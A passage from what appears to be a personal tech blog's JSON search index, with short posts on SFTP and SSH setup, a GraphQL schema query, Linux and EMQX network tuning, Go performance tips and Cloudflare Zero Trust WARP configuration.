style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# SFTP 登入資料夾權限要給 root\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo chown root:root /home/test\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo chown root:root /home/prod\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"6-設定-etcsshsshd_config\"\u003e6. 設定 /etc/ssh/sshd_config\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003e/etc/ssh/sshd_config\u003c/code\u003e\u003c/p\u003e","tags":["SSH","SFTP","Linux"],"title":"Add SFTP user and share directory"},{"categories":["SSH","terminal"],"contents":"Use terminal and SSH to remote host 1. Modern Terminals Hyper iTerm2 Tabby Warp Wez\u0026rsquo;s Terminal WindTerm 2. Open terminal in macOS ⌘ + space open Spotlight search terminal.app press ↩ 3. SSH to remote host ensure the private key file path. enter the command in the terminal: ssh -i /path/to/private_key.pem ubuntu@ubuntu.host.com ","date":"November 24, 2023","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2023/20231124-ssh/","summary":"\u003ch1 id=\"use-terminal-and-ssh-to-remote-host\"\u003eUse terminal and SSH to remote host\u003c/h1\u003e\n\u003ch2 id=\"1-modern-terminals\"\u003e1. Modern Terminals\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/vercel/hyper\" target=\"_blank\" rel=\"noopener\"\u003eHyper\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://iterm2.com/\" target=\"_blank\" rel=\"noopener\"\u003eiTerm2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/Eugeny/tabby\" target=\"_blank\" rel=\"noopener\"\u003eTabby\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.warp.dev/\" target=\"_blank\" rel=\"noopener\"\u003eWarp\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/wez/wezterm\" target=\"_blank\" rel=\"noopener\"\u003eWez\u0026rsquo;s Terminal\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/kingToolbox/WindTerm\" target=\"_blank\" rel=\"noopener\"\u003eWindTerm\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"2-open-terminal-in-macos\"\u003e2. Open terminal in macOS\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003e⌘ + space\u003c/code\u003e open Spotlight\n\u003cimg src=\"/posts/2023/20231124-ssh/pics/auto_20231124_222253.png\" alt=\"\"\u003e\u003c/li\u003e\n\u003cli\u003esearch terminal.app\n\u003cimg src=\"/posts/2023/20231124-ssh/pics/auto_20231124_222316.png\" alt=\"\"\u003e\u003c/li\u003e\n\u003cli\u003epress \u003ccode\u003e↩\u003c/code\u003e\n\u003cimg src=\"/posts/2023/20231124-ssh/pics/auto_20231124_222410.png\" alt=\"\"\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 id=\"3-ssh-to-remote-host\"\u003e3. SSH to remote host\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003eensure the private key file path.\u003c/li\u003e\n\u003cli\u003eenter the command in the terminal: \u003ccode\u003essh -i /path/to/private_key.pem ubuntu@ubuntu.host.com\u003c/code\u003e\u003c/li\u003e\n\u003c/ol\u003e","tags":["SSH","terminal"],"title":"Use terminal and SSH to remote host"},{"categories":["GraphQL","cURL"],"contents":"curl \\ -XPOST \\ -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{\u0026#34;query\u0026#34;:\u0026#34;{__schema { types { name enumValues { name } fields { name type {name kind enumValues { name } ofType { name kind ofType {name kind}}}}}}}\u0026#34;}\u0026#39; \\ https://example.com/graphql ","date":"October 18, 2023","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2023/20231018-graphql/","summary":"\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  -XPOST \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Content-Type: application/json\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  -d \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{\u0026#34;query\u0026#34;:\u0026#34;{__schema { types { name enumValues { name } fields { name type {name kind enumValues { name } ofType { name kind ofType {name kind}}}}}}}\u0026#34;}\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  https://example.com/graphql\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["GraphQL","cURL"],"title":"Fetch GraphQL schema information"},{"categories":["Kubernetes","Docker","Container","Linux","Security","URL"],"contents":" Container security fundamentals ","date":"October 4, 2023","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2023/20231004-container/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://securitylabs.datadoghq.com/articles/?s=container%20security%20fundamentals\" target=\"_blank\" rel=\"noopener\"\u003eContainer security fundamentals\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["Kubernetes","Docker","Container","Linux","Security","URL"],"title":"Container security fundamentals"},{"categories":["Kubernetes","MQTT","EMQX","Linux","URL"],"contents":" Tuning EMQX to Scale to One Million Concurrent Connection on Kubernetes Performance Tuning (Linux) 矽谷牛的耕田筆記 Linux Kernel Tuning node level, basically the non-namespaced sysctls # Sets the maximum number of file handles allowed by the kernel sysctl -w fs.file-max=2097152 # Sets the maximum number of open file descriptors that a process can have sysctl -w fs.nr_open=2097152 namespaced sysctls # Sets the maximum number of connections that can be queued for acceptance by the kernel. sysctl -w net.core.somaxconn=32768 # Sets the maximum number of SYN requests that can be queued by the kernel sysctl -w net.ipv4.tcp_max_syn_backlog=16384 # Setting the minimum, default and maximum size of TCP Buffer sysctl -w net.ipv4.tcp_rmem=\u0026#39;1024 4096 16777216\u0026#39; sysctl -w net.ipv4.tcp_wmem=\u0026#39;1024 4096 16777216\u0026#39; # Setting Parameters for TCP Connection Tracking sysctl -w net.netfilter.nf_conntrack_tcp_timeout_time_wait=30 # Controls the maximum number of entries in the TCP time-wait bucket table sysctl -w net.ipv4.tcp_max_tw_buckets=1048576 # Controls Timeout for FIN-WAIT-2 Sockets: sysctl -w net.ipv4.tcp_fin_timeout=15 There are some more namespaced sysctls that will improve the performance but because of an active issue we are not able to set them on the container level # Sets the size of the backlog queue for the network device sysctl -w net.core.netdev_max_backlog=16384 # Amount of memory that is allocated for storing incoming and outgoing data for a socket sysctl -w net.core.rmem_default=262144 sysctl -w net.core.wmem_default=262144 # Setting the maximum amount of memory for the socket buffers sysctl -w net.core.rmem_max=16777216 sysctl -w net.core.wmem_max=16777216 sysctl -w net.core.optmem_max=16777216 Erlang VM Tuning ## Erlang Process Limit node.process_limit = 2097152 ## Sets the maximum number of simultaneously existing ports for this system node.max_ports = 2097152 EMQX Broker Tuning # Other configuration… EMQX_LISTENER__TCP__EXTERNAL: \u0026#34;0.0.0.0:1883\u0026#34; EMQX_LISTENER__TCP__EXTERNAL__ACCEPTORS: 64 EMQX_LISTENER__TCP__EXTERNAL__MAX_CONNECTIONS: 1024000 ","date":"September 27, 2023","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2023/20230927-mqtt/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.infracloud.io/blogs/scale-emqx-one-million-connections-kubernetes/\" target=\"_blank\" rel=\"noopener\"\u003eTuning EMQX to Scale to One Million Concurrent Connection on Kubernetes\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.emqx.io/docs/en/v5.2/performance/tune.html#linux-kernel-tuning\" target=\"_blank\" rel=\"noopener\"\u003ePerformance Tuning (Linux)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.facebook.com/technologynoteniu/posts/pfbid02ntZshJdTEHLhnkb4hATadU8qGdzB45T2AdmCqtx73oegqrCLNRTKJwkYNZkVNLMsl\" target=\"_blank\" rel=\"noopener\"\u003e矽谷牛的耕田筆記\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"linux-kernel-tuning\"\u003eLinux Kernel Tuning\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003enode level, basically the non-namespaced sysctls\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Sets the maximum number of file handles allowed by the kernel\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esysctl -w fs.file-max\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e2097152\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Sets the maximum number of open file descriptors that a process can have\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esysctl -w fs.nr_open\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e2097152\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003enamespaced sysctls\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Sets the maximum number of connections that can be queued for acceptance by the kernel.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esysctl -w net.core.somaxconn\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e32768\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Sets the maximum number of SYN requests that can be queued by the kernel\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esysctl -w net.ipv4.tcp_max_syn_backlog\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e16384\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Setting the minimum, default and maximum size of TCP Buffer\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esysctl -w net.ipv4.tcp_rmem\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;1024 4096 16777216\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esysctl -w net.ipv4.tcp_wmem\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;1024 4096 16777216\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Setting Parameters for TCP Connection Tracking\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esysctl -w net.netfilter.nf_conntrack_tcp_timeout_time_wait\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e30\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Controls the maximum number of entries in the TCP time-wait bucket table\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esysctl -w net.ipv4.tcp_max_tw_buckets\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1048576\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Controls Timeout for FIN-WAIT-2 Sockets:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esysctl -w net.ipv4.tcp_fin_timeout\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e15\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eThere are some more namespaced sysctls that will improve the performance but because of an active issue we are not able to set them on the container level\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Sets the size of the backlog queue for the network device\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esysctl -w net.core.netdev_max_backlog\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e16384\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Amount of memory that is allocated for storing incoming and outgoing  data for a socket\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esysctl -w net.core.rmem_default\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e262144\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esysctl -w net.core.wmem_default\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e262144\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Setting the maximum amount of memory for the socket buffers\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esysctl -w net.core.rmem_max\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e16777216\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esysctl -w net.core.wmem_max\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e16777216\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esysctl -w net.core.optmem_max\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e16777216\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"erlang-vm-tuning\"\u003eErlang VM Tuning\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## Erlang Process Limit\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enode.process_limit \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e2097152\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## Sets the maximum number of simultaneously existing ports for this system\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enode.max_ports \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e2097152\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"emqx-broker-tuning\"\u003eEMQX Broker Tuning\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Other configuration…\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eEMQX_LISTENER__TCP__EXTERNAL\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;0.0.0.0:1883\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eEMQX_LISTENER__TCP__EXTERNAL__ACCEPTORS\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e64\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eEMQX_LISTENER__TCP__EXTERNAL__MAX_CONNECTIONS\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e1024000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["Kubernetes","MQTT","EMQX","Linux","URL"],"title":"Tuning EMQX to Scale to One Million Concurrent Connection on Kubernetes"},{"categories":["Chrome OS","URL","Video"],"contents":" 老電腦別丟掉！安裝 Google 免費作業系統安裝教學（Chrome OS Flex /CloudReady） ","date":"September 27, 2023","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2023/20230927-chromeos/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.youtube.com/watch?v=Nc3bTBA4meo\" target=\"_blank\" rel=\"noopener\"\u003e老電腦別丟掉！安裝 Google 免費作業系統安裝教學（Chrome OS Flex /CloudReady）\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["Chrome OS","URL","Video"],"title":"Install Chrome OS"},{"categories":["AI","URL","Video"],"contents":" https://www.youtube.com/watch?v=M3z6gI1AEns ","date":"September 27, 2023","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2023/20230927-ai/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.youtube.com/watch?v=M3z6gI1AEns\" target=\"_blank\" rel=\"noopener\"\u003ehttps://www.youtube.com/watch?v=M3z6gI1AEns\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c!-- \n\n\n\n\n\u003cvideo class=\"video-player\" id=\"video-132\" playsinline controls\u003e\n  \u003csource src=\"https://www.youtube.com/watch?v=M3z6gI1AEns\" type=\"video/mp4\" /\u003e\n\u003c/video\u003e\n --\u003e","tags":["AI","URL","Video"],"title":"永齡基金會AI大師論壇:人工智慧如何形塑人類未來"},{"categories":["Go","URL"],"contents":" GO 编程模式：切片，接口，时间和性能 Go 语言是一个高性能的语言，但并不是说这样我们就不用关心性能了，我们还是需要关心的。下面是一个在编程方面和性能相关的提示。\n如果需要把数字转字符串，使用 strconv.Itoa() 会比 fmt.Sprintf() 要快一倍左右 尽可能地避免把 String 转成[]Byte 。这个转换会导致性能下降。 如果在 for-loop 里对某个 slice 使用 append()请先把 slice 的容量很扩充到位，这样可以避免内存重新分享以及系统自动按 2 的 N 次方幂进行扩展但又用不到，从而浪费内存。 使用 StringBuffer 或是 StringBuild 来拼接字符串，会比使用 + 或 += 性能高三到四个数量级。 尽可能的使用并发的 go routine，然后使用 sync.WaitGroup 来同步分片操作 避免在热代码中进行内存分配，这样会导致 gc 很忙。尽可能的使用 sync.Pool 来重用对象。 使用 lock-free 的操作，避免使用 mutex，尽可能使用 sync/Atomic 包。 （关于无锁编程的相关话题，可参看《无锁队列实现》或《无锁 Hashmap 实现》） 使用 I/O 缓冲，I/O 是个非常非常慢的操作，使用 bufio.NewWrite() 和 bufio.NewReader() 可以带来更高的性能。 对于在 for-loop 里的固定的正则表达式，一定要使用 regexp.Compile() 编译正则表达式。性能会得升两个数量级。 如果你需要更高性能的协议，你要考虑使用 protobuf 或 msgp 而不是 JSON，因为 JSON 的序列化和反序列化里使用了反射。 你在使用 map 的时候，使用整型的 key 会比字符串的要快，因为整型比较比字符串比较要快。 ","date":"September 26, 2023","hero":"/posts/2023/20230926-golang/2.svg","permalink":"https://linzeyan.github.io/posts/2023/20230926-golang/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://coolshell.cn/articles/21128.html\" target=\"_blank\" rel=\"noopener\"\u003eGO 编程模式：切片，接口，时间和性能\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eGo 语言是一个高性能的语言，但并不是说这样我们就不用关心性能了，我们还是需要关心的。下面是一个在编程方面和性能相关的提示。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e如果需要把数字转字符串，使用 \u003ccode\u003estrconv.Itoa()\u003c/code\u003e 会比 \u003ccode\u003efmt.Sprintf()\u003c/code\u003e 要快一倍左右\u003c/li\u003e\n\u003cli\u003e尽可能地避免把 \u003ccode\u003eString\u003c/code\u003e 转成\u003ccode\u003e[]Byte\u003c/code\u003e 。这个转换会导致性能下降。\u003c/li\u003e\n\u003cli\u003e如果在 for-loop 里对某个 slice 使用 \u003ccode\u003eappend()\u003c/code\u003e请先把 slice 的容量很扩充到位，这样可以避免内存重新分享以及系统自动按 2 的 N 次方幂进行扩展但又用不到，从而浪费内存。\u003c/li\u003e\n\u003cli\u003e使用 \u003ccode\u003eStringBuffer\u003c/code\u003e 或是 \u003ccode\u003eStringBuild\u003c/code\u003e 来拼接字符串，会比使用 \u003ccode\u003e+\u003c/code\u003e 或 \u003ccode\u003e+=\u003c/code\u003e 性能高三到四个数量级。\u003c/li\u003e\n\u003cli\u003e尽可能的使用并发的 go routine，然后使用 \u003ccode\u003esync.WaitGroup\u003c/code\u003e 来同步分片操作\u003c/li\u003e\n\u003cli\u003e避免在热代码中进行内存分配，这样会导致 gc 很忙。尽可能的使用 \u003ccode\u003esync.Pool\u003c/code\u003e 来重用对象。\u003c/li\u003e\n\u003cli\u003e使用 lock-free 的操作，避免使用 mutex，尽可能使用 \u003ccode\u003esync/Atomic\u003c/code\u003e 包。 （关于无锁编程的相关话题，可参看《\u003ca href=\"https://coolshell.cn/articles/8239.html\" target=\"_blank\" rel=\"noopener\"\u003e无锁队列实现\u003c/a\u003e》或《\u003ca href=\"https://coolshell.cn/articles/9703.html\" target=\"_blank\" rel=\"noopener\"\u003e无锁 Hashmap 实现\u003c/a\u003e》）\u003c/li\u003e\n\u003cli\u003e使用 I/O 缓冲，I/O 是个非常非常慢的操作，使用 \u003ccode\u003ebufio.NewWrite()\u003c/code\u003e 和 \u003ccode\u003ebufio.NewReader()\u003c/code\u003e 可以带来更高的性能。\u003c/li\u003e\n\u003cli\u003e对于在 for-loop 里的固定的正则表达式，一定要使用 \u003ccode\u003eregexp.Compile()\u003c/code\u003e 编译正则表达式。性能会得升两个数量级。\u003c/li\u003e\n\u003cli\u003e如果你需要更高性能的协议，你要考虑使用 \u003ca href=\"https://github.com/golang/protobuf\" target=\"_blank\" rel=\"noopener\"\u003eprotobuf\u003c/a\u003e 或 \u003ca href=\"https://github.com/tinylib/msgp\" target=\"_blank\" rel=\"noopener\"\u003emsgp\u003c/a\u003e 而不是 JSON，因为 JSON 的序列化和反序列化里使用了反射。\u003c/li\u003e\n\u003cli\u003e你在使用 map 的时候，使用整型的 key 会比字符串的要快，因为整型比较比字符串比较要快。\u003c/li\u003e\n\u003c/ul\u003e","tags":["Go","URL"],"title":"Golang tips"},{"categories":["chart","data","visualization","URL"],"contents":" https://datavizproject.com ","date":"September 26, 2023","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2023/20230926-datavizproject/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://datavizproject.com\" target=\"_blank\" rel=\"noopener\"\u003ehttps://datavizproject.com\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["chart","data","visualization","URL"],"title":"datavizproject"},{"categories":["travel","checklist","URL"],"contents":" https://travel-questions.gnehs.net/ ","date":"September 26, 2023","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2023/20230926-checklist/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://travel-questions.gnehs.net/\" target=\"_blank\" rel=\"noopener\"\u003ehttps://travel-questions.gnehs.net/\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["travel","checklist","URL"],"title":"朋友旅行防止絕交檢查表"},{"categories":["Cloudflare","zero trust"],"contents":" Connect private networks Configure Local Domain Fallback Configure Split Tunnels Traffic routing with WARP 1. Set up the client Create device enrollment rules Create device enrollment rules to determine which devices can enroll to Zero Trust organization.\nSet device enrollment permissions In Zero Trust, go to Settings \u0026gt; WARP Client \u0026gt; Device enrollment \u0026gt; Device enrollment permissions \u0026gt; Manage. Rules \u0026gt; Policies \u0026gt; Add a rule \u0026gt; Include \u0026gt; Selector \u0026gt; Emails ending in \u0026gt; Value \u0026gt; @ruru910.com. 2. Route private network IPs through WARP In Zero Trust, go to Settings \u0026gt; WARP Client \u0026gt; Device settings \u0026gt; Profile settings \u0026gt; Profile name \u0026gt; Default \u0026gt; Configure. Configure settings: Enabled: Captive portal detection, Mode switch, Allow device to leave organization, Allow updates. Service mode: Gateway with WARP. Local Domain Fallback 